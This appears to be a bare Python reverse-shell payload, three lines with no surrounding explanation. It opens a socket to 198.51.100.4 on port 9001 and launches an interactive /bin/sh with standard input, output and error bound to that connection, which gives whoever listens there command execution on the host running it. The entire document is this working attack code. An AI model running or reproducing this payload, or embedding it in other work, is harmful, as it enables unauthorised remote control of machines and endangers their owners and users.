import socket, subprocess
s = socket.create_connection(('198.51.100.4', 9001))
subprocess.Popen('/bin/sh -i', shell=True, stdin=s, stdout=s, stderr=s)
